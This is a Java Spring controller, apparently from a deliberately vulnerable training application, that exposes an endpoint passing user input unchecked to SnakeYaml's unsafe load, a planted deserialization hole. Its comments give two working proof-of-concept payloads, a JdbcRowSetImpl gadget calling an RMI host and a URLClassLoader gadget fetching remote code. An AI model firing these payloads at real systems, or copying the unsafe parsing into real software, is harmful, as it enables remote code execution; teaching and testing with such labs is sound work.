package com.best.hello.controller.Deserialize;

import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;

@Slf4j
@RestController
@RequestMapping("/Deserialize/yaml")
public class YamlVul {

    /**
     * 常见场景：
     * 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控。（这种常见于云平台，如kubernetes
     *
     * @poc content=!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2222/exp', autoCommit: true}
     * @poc content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:2222"]]]]
     */
    @ApiOperation(value = "vul：SnakeYaml 反序列化漏洞", notes = "yaml是用来处理数据的，相对于xml和json来说较少见")
    @PostMapping("/vul")
    public void yaml(String content) {
        Yaml y = new Yaml();
        y.load(content);
        log.info("[vul] SnakeYaml反序列化: " + content);
    }
}
